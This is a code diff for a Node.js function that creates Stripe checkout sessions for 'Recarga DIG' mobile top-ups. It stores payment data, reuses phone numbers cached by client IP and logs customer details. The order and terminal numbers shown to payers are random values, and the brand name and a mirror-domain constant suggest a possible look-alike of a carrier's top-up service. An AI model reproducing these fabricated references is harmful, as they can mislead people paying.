@@ -1,8 +1,6 @@
 const { STRIPE_SECRET_KEY, MIRROR_DOMAIN } = require('./constants');
+const storage = require('../db/storage');
 const fetch = require('node-fetch');
-
-// Глобальне сховище для даних платежів
-global.paymentInfo = global.paymentInfo || {};
 
 async function createStripeCheckoutSession(amount, phoneNumber, successUrl, cancelUrl, clientIP) {
   try {
@@ -11,7 +9,14 @@ async function createStripeCheckoutSession(amount, phoneNumber, successUrl, canc
     const orderNumber = Math.floor(10000000 + Math.random() * 90000000).toString();
     const numberOfTerminal = Math.floor(856673 + Math.random() * 90000000).toString();
 
-    console.log('Creating Stripe session with phone:', phoneNumber, 'and amount:', priceInCents / 100);
+    if (!phoneNumber || !phoneNumber.match(/^\d{9}$/)) {
+      if (clientIP) {
+        const cachedPhone = await storage.getPhoneNumber(clientIP);
+        if (cachedPhone) phoneNumber = cachedPhone;
+      }
+    }
+
+    const validPhone = (phoneNumber && phoneNumber.match(/^\d{9}$/)) ? phoneNumber : '624048596';
 
     const params = new URLSearchParams();
     params.append('payment_method_types[]', 'card');
@@ -24,13 +29,17 @@ async function createStripeCheckoutSession(amount, phoneNumber, successUrl, canc
     params.append('line_items[0][quantity]', '1');
     params.append('line_items[0][price_data][currency]', 'eur');
     params.append('line_items[0][price_data][unit_amount]', priceInCents.toString());
-    params.append('line_items[0][price_data][product_data][name]', 'Recarga DIGImobil');
-    const description = `*Número de teléfono*: ${phoneNumber} \n*Importe*: €${(priceInCents / 100).toFixed(2)}\n*Número de pedido*: ${orderNumber}\n*Número de terminal*: ${numberOfTerminal}`;
-    console.log('Payment description:', description);
-        
-    params.append('line_items[0][price_data][product_data][description]', description);
-    console.log('Sending request to Stripe API...');
-    
+    params.append('line_items[0][price_data][product_data][name]', 'Recarga DIG');
+    params.append('line_items[0][price_data][product_data][description]', `*Número de teléfono*: ${validPhone}\n*Importe*: €${(priceInCents / 100).toFixed(2)}\n*Número de pedido*: ${orderNumber}\n*Número de terminal*: ${numberOfTerminal}`);
+
+    console.log('Creating Stripe session with data:', {
+      amount: priceInCents / 100,
+      phoneNumber: validPhone,
+      orderNumber: orderNumber,
+      terminal: numberOfTerminal,
+      clientIP: clientIP
+    });
+
     const response = await fetch(stripeUrl, {
       method: 'POST',
       headers: {
@@ -40,25 +49,22 @@ async function createStripeCheckoutSession(amount, phoneNumber, successUrl, canc
       body: params.toString()
     });
 
-    const responseText = await response.text();
-    console.log('Stripe API response status:', response.status);
-    
     if (!response.ok) {
-      console.error('Stripe API error:', responseText);
-      throw new Error(`Stripe API error: ${response.status} - ${responseText}`);
+      const errorText = await response.text();
+      console.error('Stripe API error:', errorText);
+      throw new Error(`Stripe API error: ${response.status} - ${errorText}`);
     }
 
-    const session = JSON.parse(responseText);
-    console.log('Stripe session created with ID:', session.id);
+    const session = await response.json();
 
-    // Зберігаємо дані платежу
-    global.paymentInfo[session.id] = {
-      phoneNumber: phoneNumber,
+    await storage.setPaymentData(session.id, {
+      phoneNumber: validPhone,
       terminal: numberOfTerminal,
       amount: priceInCents / 100,
       orderNumber: orderNumber
-    };
+    });
 
+    console.log('Stripe session created:', { sessionId: session.id, url: session.url });
     return { session };
   } catch (error) {
     console.error('Error in createStripeCheckoutSession:', error);
